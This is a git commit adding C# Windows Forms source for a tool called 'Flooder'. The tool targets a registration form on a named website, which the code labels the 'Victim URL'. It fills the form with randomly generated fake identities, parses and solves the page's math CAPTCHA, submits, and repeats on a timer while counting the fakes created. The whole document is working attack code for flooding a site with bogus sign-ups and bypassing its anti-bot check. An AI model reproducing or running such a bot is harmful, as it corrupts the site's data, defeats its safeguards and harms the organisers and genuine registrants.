aceb2941975e32e16590b3dd59ee3958fba38a19
abubrbor <rawan.hamdan23@gmail.com>
2016-04-20 19:28:05 -1200

    Final code

---
+++ FormMain.Designer.cs
@@ -0,0 +1,108 @@
+﻿namespace Flooder
+{
+    partial class FormMain
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.webBrowser = new System.Windows.Forms.WebBrowser();
+            this.buttonStart = new System.Windows.Forms.Button();
+            this.labelCount = new System.Windows.Forms.Label();
+            this.timerNext = new System.Windows.Forms.Timer(this.components);
+            this.timer_Refresh = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // webBrowser
+            // 
+            this.webBrowser.Location = new System.Drawing.Point(12, 12);
+            this.webBrowser.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webBrowser.Name = "webBrowser";
+            this.webBrowser.ScriptErrorsSuppressed = true;
+            this.webBrowser.Size = new System.Drawing.Size(862, 514);
+            this.webBrowser.TabIndex = 0;
+            this.webBrowser.DocumentCompleted += new System.Windows.Forms.WebBrowserDocumentCompletedEventHandler(this.webBrowser_DocumentCompleted);
+            // 
+            // buttonStart
+            // 
+            this.buttonStart.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.buttonStart.ForeColor = System.Drawing.Color.Lime;
+            this.buttonStart.Location = new System.Drawing.Point(891, 12);
+            this.buttonStart.Name = "buttonStart";
+            this.buttonStart.Size = new System.Drawing.Size(379, 34);
+            this.buttonStart.TabIndex = 1;
+            this.buttonStart.Text = "Start";
+            this.buttonStart.UseVisualStyleBackColor = true;
+            this.buttonStart.Click += new System.EventHandler(this.buttonStart_Click);
+            // 
+            // labelCount
+            // 
+            this.labelCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.labelCount.ForeColor = System.Drawing.Color.Red;
+            this.labelCount.Location = new System.Drawing.Point(884, 66);
+            this.labelCount.Name = "labelCount";
+            this.labelCount.Size = new System.Drawing.Size(386, 34);
+            this.labelCount.TabIndex = 2;
+            this.labelCount.Text = "0";
+            this.labelCount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // timerNext
+            // 
+            this.timerNext.Interval = 2000;
+            this.timerNext.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // timer_Refresh
+            // 
+            this.timer_Refresh.Interval = 7000;
+            this.timer_Refresh.Tick += new System.EventHandler(this.timer_Refresh_Tick);
+            // 
+            // FormMain
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(1282, 538);
+            this.Controls.Add(this.labelCount);
+            this.Controls.Add(this.buttonStart);
+            this.Controls.Add(this.webBrowser);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.Name = "FormMain";
+            this.Text = "Flooder";
+            this.Load += new System.EventHandler(this.FormMain_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.WebBrowser webBrowser;
+        private System.Windows.Forms.Button buttonStart;
+        private System.Windows.Forms.Label labelCount;
+        private System.Windows.Forms.Timer timerNext;
+        private System.Windows.Forms.Timer timer_Refresh;
+    }
+}
---
+++ FormMain.cs
@@ -0,0 +1,463 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Globalization;
+
+namespace Flooder
+{
+    public partial class FormMain : Form
+    {
+        public FormMain()
+        {
+            InitializeComponent();
+        }
+
+
+        //Victim URL
+        string RegURL = @"http://www.jordantophacker.com/registration";
+        private void buttonStart_Click(object sender, EventArgs e)
+        {
+           
+            timerNext.Enabled = false;
+            pageloaded = false;
+            loop = 0;
+
+            webBrowser.Navigate(RegURL);
+            buttonStart.Text = "Refresh ...";
+
+        }
+
+
+
+
+        int GetRandomMonthIndex()
+        {
+            return new Random(DateTime.Now.Millisecond).Next(1, 13);
+        }
+
+        string GetRandomDayofMonth(int month)
+        {
+
+            return new Random(DateTime.Now.Millisecond).Next(1, DateTime.DaysInMonth(DateTime.Now.Year, month)).ToString();
+        }
+
+        string GetRandomYear()
+        {
+            return new Random(DateTime.Now.Millisecond).Next(1975, 1998).ToString();
+        }
+
+        string GetRandomGender()
+        {
+            int dummy = new Random(DateTime.Now.Millisecond).Next(1, 3);
+
+            return dummy == 1 ? "Male" : "Female";
+
+
+        }
+
+        string GetRandomPhoneNumber()
+        {
+            int dummy = new Random(DateTime.Now.Millisecond).Next(1, 4);
+            string ret = "";
+
+            switch (dummy)
+            {
+                case 1:
+                    ret = ("0795" + new Random(DateTime.Now.Millisecond).Next(100000, 900000).ToString());
+                    break;
+
+                case 2:
+
+                    ret = ("078" + new Random(DateTime.Now.Millisecond).Next(1000000, 9000000).ToString());
+                    break;
+
+                case 3:
+
+                    ret = ("077" + new Random(DateTime.Now.Millisecond).Next(1000000, 9000000).ToString());
+                    break;
+
+            }
+
+            return ret;
+
+        }
+
+        string GetRandomEmail()
+        {
+            string domain = GetRandomDomain();
+
+            return namer.NextName + "@" + domain;
+        }
+
+
+        string GetRandomDomain()
+        {
+            return Domains[new Random(DateTime.Now.Millisecond).Next(0, Domains.Count)];
+        }
+
+
+        string GetRandomName(string Gender)
+        {
+            if (Gender == "Male")
+            {
+                return MaleNames[new Random(DateTime.Now.Millisecond).Next(0, MaleNames.Count)];
+            }
+            else
+            {
+                return FemaleNames[new Random(DateTime.Now.Millisecond).Next(0, FemaleNames.Count)];
+            }
+        }
+
+
+        string GetRandomTshirt()
+        {
+            return Tshirt[new Random(DateTime.Now.Millisecond).Next(0, Tshirt.Count)];
+        }
+
+
+        string SolveMathCaptcha(string doc)
+        {
+
+     
+            string tag = "<input class=\"form-control form-text required\"";
+
+            int tagindex = doc.IndexOf(tag);
+
+            int mathIndex = tagindex;
+
+            while (doc[mathIndex] != '>')
+            {
+                mathIndex--;
+            }
+
+
+            string Math = doc.Substring(mathIndex + 2, tagindex - mathIndex - 3);
+
+            Math = Math.Replace("=", "");
+
+
+            ExpressionEvaluator exp = new ExpressionEvaluator();
+
+            string res = exp.Evaluate(Math).ToString();
+
+            return res;
+
+        }
+
+
+        string GetRandomCity()
+        {
+            return Cities[new Random(DateTime.Now.Millisecond).Next(0, Cities.Count)];
+        }
+
+
+        string GetRandomBackground()
+        {
+            return Background[new Random(DateTime.Now.Millisecond).Next(0, Background.Count)];
+        }
+
+        string GetRandominstitute()
+        {
+            return Institute[new Random(DateTime.Now.Millisecond).Next(0, Institute.Count)];
+        }
+
+
+
+        int loop = 0;
+        bool submitted = false;
+        int fakes = 0;
+
+        private void webBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+
+            pageloaded = true;
+            timer_Refresh.Enabled = false;
+
+            if (e.Url.Host != "www.jordantophacker.com")
+            {
+                return;
+            }
+
+            loop++;
+            if (loop == 2)
+            {
+
+                fakes++;
+
+                labelCount.Text = fakes.ToString();
+
+                submitted = true;
+                timerNext.Enabled = true;
+                return;
+            }
+
+
+            HtmlElement form = webBrowser.Document.GetElementById("webform-client-form-1");
+
+            if (form != null)
+            {
+
+                string Gender = GetRandomGender();
+                string FirstName = "";
+                string LastName = "";
+
+                FirstName = GetRandomName(Gender);
+                System.Threading.Thread.Sleep(50);
+                LastName = GetRandomName("Male");
+
+
+                //First name
+                HtmlElement elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-first-name");
+                elm.SetAttribute("value", FirstName);
+
+
+
+                //Last name
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-last-name");
+                elm.SetAttribute("value", LastName);
+
+
+                //Month
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-birthday-month");
+                int month = GetRandomMonthIndex();
+                elm.SetAttribute("value", month.ToString());
+
+
+                //Day
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-birthday-day");
+                elm.SetAttribute("value", GetRandomDayofMonth(month));
+
+
+                //year
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-birthday-year");
+                elm.SetAttribute("value", GetRandomYear());
+
+
+                //Nationality
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-nationality");
+                elm.SetAttribute("value", "JO");
+
+
+                //Gender
+
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-gender");
+                elm.SetAttribute("value", Gender);
+
+
+                //Phone
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-phone-number");
+                elm.SetAttribute("value", GetRandomPhoneNumber());
+
+
+                //Email
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-email");
+                elm.SetAttribute("value", GetRandomEmail());
+
+
+                //T-shirt
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-t-shirt-size");
+                elm.SetAttribute("value", GetRandomTshirt());
+
+
+                //Address
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-address");
+                elm.SetAttribute("value", "Jordan");
+
+
+                //City
+                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-city");
+                elm.SetAttribute("value", GetRandomCity());
+
+                //background
+                elm = webBrowser.Document.GetElementById("edit-submitted-technical-background-background");
+                elm.SetAttribute("value", GetRandomBackground());
+
+
+                //ins
+                elm = webBrowser.Document.GetElementById("edit-submitted-technical-background-institute-name");
+                elm.SetAttribute("value", GetRandominstitute());
+
+
+                //ins
+                elm = webBrowser.Document.GetElementById("edit-submitted-accept-1");
+                elm.InvokeMember("CLICK");
+
+
+                //Math
+                elm = webBrowser.Document.GetElementById("edit-captcha-response");
+                elm.SetAttribute("value", SolveMathCaptcha(webBrowser.DocumentText));
+
+
+                Application.DoEvents();
+
+                
+                form.InvokeMember("submit");
+
+            }
+
+        }
+
+
+        List<string> Emails = new List<string>();
+        List<string> MaleNames = new List<string>();
+        List<string> FemaleNames = new List<string>();
+        List<string> Tshirt = new List<string>();
+        List<string> Cities = new List<string>();
+        List<string> Background = new List<string>();
+        List<string> Institute = new List<string>();
+        List<string> Domains = new List<string>();
+
+        MarkovNameGenerator namer;
+
+        private void FormMain_Load(object sender, EventArgs e)
+        {
+
+            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\Emails.txt"))
+            {
+                while (!fs.EndOfStream)
+                {
+
+                    string ret = fs.ReadLine().Trim();
+                    Emails.Add(ret);
+
+                }
+            }
+
+            namer = new MarkovNameGenerator(Emails, 2, 7);
+
+
+            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\dict_arabicnames_female.txt"))
+            {
+                while (!fs.EndOfStream)
+                {
+
+                    string ret = fs.ReadLine().Trim();
+                    FemaleNames.Add(ret);
+
+                }
+            }
+
+            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\dict_arabicnames_male.txt"))
+            {
+                while (!fs.EndOfStream)
+                {
+
+                    string ret = fs.ReadLine().Trim();
+                    MaleNames.Add(ret);
+
+                }
+            }
+
+            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\Domains.txt"))
+            {
+                while (!fs.EndOfStream)
+                {
+
+                    string ret = fs.ReadLine().Trim();
+                    Domains.Add(ret);
+
+                }
+            }
+
+
+
+            Tshirt.Add("XL");
+            Tshirt.Add("L");
+            Tshirt.Add("M");
+            Tshirt.Add("S");
+
+
+            Cities.Add("Amman");
+            Cities.Add("Zarqa");
+            Cities.Add("Irbid");
+            Cities.Add("Mafraq");
+            Cities.Add("Jerash");
+            Cities.Add("Aqaba");
+            Cities.Add("Madaba");
+            Cities.Add("Salt");
+            Cities.Add("Russeifa");
+            Cities.Add("Wadi as-ser");
+            Cities.Add("Tila al ali");
+            Cities.Add("Ar ramtha");
+            Cities.Add("sahab");
+            Cities.Add("karak");
+            Cities.Add("ajloun");
+
+
+
+
+            Background.Add("School Student");
+            Background.Add("University Student");
+            Background.Add("Professional");
+
+
+            Institute.Add("Jordan university");
+            Institute.Add("Jerash university");
+            Institute.Add("Yarmouk");
+            Institute.Add("Oxford schools");
+            Institute.Add("kings academy");
+            Institute.Add("PSUT");
+            Institute.Add("none");
+            Institute.Add("freelancer");
+            Institute.Add("internet");
+            Institute.Add("facebook");
+            Institute.Add("balqa univirsirt");
+            Institute.Add("heashmite university");
+            Institute.Add("al al-bayt");
+            Institute.Add("google");
+            Institute.Add("no institute");
+            Institute.Add("Ajloun National University");
+            Institute.Add("Al-Ahliyya Amman University");
+            Institute.Add("Al-Isra University");
+            Institute.Add("Al-Zaytoonah University of Jordan");
+            Institute.Add("Amman Arab University");
+            Institute.Add("Applied Science Private University");
+            Institute.Add("Arab Open University");
+            Institute.Add("German-Jordanian University");
+            Institute.Add("Middle East University");
+            Institute.Add("Philadelphia University");
+            Institute.Add("Petra University");
+            Institute.Add("Princess Sumaya University for Technology");
+            Institute.Add("Jerash Private University");
+            Institute.Add("Mutah University");
+            Institute.Add("Tafila Technical University");
+            Institute.Add("Zarqa Private University");
+
+        }
+
+
+        bool pageloaded = false;
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            timerNext.Enabled = false;
+            pageloaded = false;
+
+            submitted = false;
+            loop = 0;
+
+            webBrowser.Navigate(RegURL);
+            timer_Refresh.Enabled = true;
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Console.WriteLine(GetRandomEmail());
+        }
+
+    
+
+        private void timer_Refresh_Tick(object sender, EventArgs e)
+        {
+            timer_Refresh.Enabled = false;
+            buttonStart.PerformClick();
+        }
+
+    }
+}
